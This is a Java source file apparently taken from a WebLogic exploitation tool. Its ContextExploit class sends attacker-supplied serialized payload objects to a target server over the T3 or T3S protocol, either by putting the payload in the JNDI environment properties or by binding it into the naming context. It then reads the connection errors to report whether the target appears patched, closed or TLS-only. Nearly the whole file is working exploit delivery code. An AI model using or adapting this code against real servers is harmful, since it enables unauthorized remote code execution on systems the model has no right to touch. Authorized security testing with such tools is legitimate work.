package bort.millipede.wlt3;

import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.CommunicationException;

public class ContextExploit {
	public static void runPropertyExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));
		//env.put("java.naming.security.principal","user");
		//env.put("java.naming.security.credentials","password");
		env.put("Prune_Tracy"+System.nanoTime(),payload); //environment property-based exploitation

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			ctx.bind("pwned"+System.nanoTime(),protocol);
			//Hashtable env2 = ctx.getEnvironment();
			//System.out.println(env2.toString());
		} catch(CommunicationException ce) {
			parseCommunicationException(ce,protocol,host,port);
		} catch(Exception e) {
			e.printStackTrace(); //TODO add --verbose support
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"); //TODO printout about --verbose setting
		} finally {
			try {
				ctx.close();
			}
			catch (Exception e) {
				//don't care
			}
		}
	}
	
	public static void runBindExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));
		//env.put("java.naming.security.principal","user");
		//env.put("java.naming.security.credentials","password");
		//env.put("Prune_Tracy"+System.nanoTime(),payload); //environment property-based exploitation

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			ctx.bind("Check_For_Millipedes"+System.nanoTime(),payload); //context bind-based exploitation
		} catch(CommunicationException ce) {
			parseCommunicationException(ce,protocol,host,port);
		} catch (Exception e) {
			e.printStackTrace(); //TODO add --verbose support
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"); //TODO printout about --verbose setting
		} finally {
			try {
				ctx.close();
			} catch (Exception e) {
				//don't care
			}
		}
	}
	
	private static void parseCommunicationException(CommunicationException ce,String protocol,String host,int port) {
		ce.printStackTrace(); //TODO add --verbose support
		
		Throwable cause = ce.getCause();
		if(cause!=null) {
			String eType = cause.getClass().getName();
			switch(eType) {
				case "weblogic.rjvm.PeerGoneException":
					System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!");
					break;
				case "java.net.ConnectException":
					String message = cause.getMessage();
					if(message!=null) {
						if(message.contains("java.io.IOException: Empty server reply")) {
							System.err.println("Target Server/Port at "+host+":"+port+" does not appear to be running "+protocol.toUpperCase()+"! Target may not be a WebLogic Server!");
						} else if(message.contains("java.net.ConnectException: Connection refused")) {
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" refused! Target port appears to be closed!");
						} else if(message.contains("javax.net.ssl.SSLHandshakeException")) {
							if(message.contains("handshake_failure")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed (Handshake Error)! Try a different TLS connection protocol!");
							} else if(message.contains("PKIX") && message.contains("unable to find valid certification path")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! "); //TODO add messaging about InstallCert
							} else {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Target host/port may not be running an SSL/TLS service!");
							}
						} else if(message.contains("javax.net.ssl.SSLException: Unsupported record version")) {
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Try a different TLS connection protocol!");
						} else if(message.contains("java.net.SocketException: Connection reset") && protocol.toUpperCase().equals("T3")) {
							System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!");
						} else {
							System.err.println("Unknown Connection Error occurred: connection failed"); //TODO printout about --verbose setting
						}
					}
					break;
				default:
					System.err.println("Unknown Connection Error occurred ("+eType+")!"); //TODO printout about --verbose setting
					break;
			}
		} else {
			System.err.println("Unknown Communication Error occurred!"); //TODO printout about --verbose setting
		}
	}
}
